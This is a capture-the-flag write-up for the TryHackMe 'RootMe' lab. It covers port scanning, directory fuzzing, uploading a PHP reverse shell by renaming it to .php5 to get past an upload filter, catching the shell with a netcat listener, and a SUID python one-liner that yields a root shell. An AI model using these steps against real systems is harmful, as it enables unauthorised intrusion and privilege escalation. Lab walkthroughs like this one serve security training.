---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/root-me/","tags":["CTF","write-up"]}
---


---
> [!INFO] Info about RootMe
>  A ctf for beginners, can you root me?

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Host discovery
## Port scan
Executing a fast general scan to all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

> [!check]- Scan the machine, how many ports are open?
> 2

---
# Enumeration
Executing a deep scan with common scripts only to ports that we are interested.
```shell
sudo nmap TARGET_IP -sCV -p 22,80 -oN nmap_enum
```
## OS
Linux, Ubuntu
## Port 22 - SSH
22/tcp open  ssh     **OpenSSH 7.6p1** Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

> [!check]- What service is running on port 22?
> SSH
## Port 80 - Apache
80/tcp open  http    Apache httpd **2.4.29** ((Ubuntu))
http-title: HackIT - Home
http-cookie-flags:
   /:
     PHPSESSID:
      httponly flag not set
http-server-header: Apache/2.4.29 (Ubuntu)

> [!check]- What version of Apache is running?
> 2.4.29

Set the ip on `/etc/hosts`
```shell
sudo echo "10.10.171.218 rootme.thm" | sudo tee -a /etc/hosts
```
### Fuzzing
```shell
wfuzz -c -t 50 --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://rootme.thm/FUZZ
```
![Pasted image 20241127224013.png](/img/user/attachments/Pasted%20image%2020241127224013.png)
> [!check]- What is the hidden directory?
> Panel

---
# Exploitation
## Apache - File upload
Go to the panel directory
![Pasted image 20241127224504.png|500](/img/user/attachments/Pasted%20image%2020241127224504.png)
Try to upload a `PHP` reverse shell from kali linux resources `/usr/share/webshells/php/php-reverse-shell.php`

Now allowed
![Pasted image 20241127224553.png|300](/img/user/attachments/Pasted%20image%2020241127224553.png)
Try to bypass the filter on Server-Side
Change the name to `/usr/share/webshells/php/php-reverse-shell.php5` and upload
![Pasted image 20241127231024.png|300](/img/user/attachments/Pasted%20image%2020241127231024.png)
Works
Set the listener
```shell
rlwrap nc -lnvp 4747
```
On the browser go to the file location
`http://rootme.thm/uploads/php-reverse-shell.php5`
The page shouldn't be loaded
![Pasted image 20241127231246.png](/img/user/attachments/Pasted%20image%2020241127231246.png)

And the listener should have received the reverse shell
![Pasted image 20241127231458.png](/img/user/attachments/Pasted%20image%2020241127231458.png)
Try [[Notes/Upgrading shell\|Upgrading shell]] (Optional)

> [!check] User flag
> ![Pasted image 20241127231847.png](/img/user/attachments/Pasted%20image%2020241127231847.png)

---
# Privilege escalation
Search SUID files
```shell
find / -perm -u=s -type f -ls 2>/dev/null
```

> [!check] Search for files with SUID permission, which file is weird?
> ![Pasted image 20241127232252.png](/img/user/attachments/Pasted%20image%2020241127232252.png)


> [!check] Find a form to escalate your privileges.
> https://gtfobins.github.io/

Abusing the python SUID
```shell
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
![Pasted image 20241127232617.png|800](/img/user/attachments/Pasted%20image%2020241127232617.png)

> [!check] Root flag
> ![Pasted image 20241127232707.png](/img/user/attachments/Pasted%20image%2020241127232707.png)

---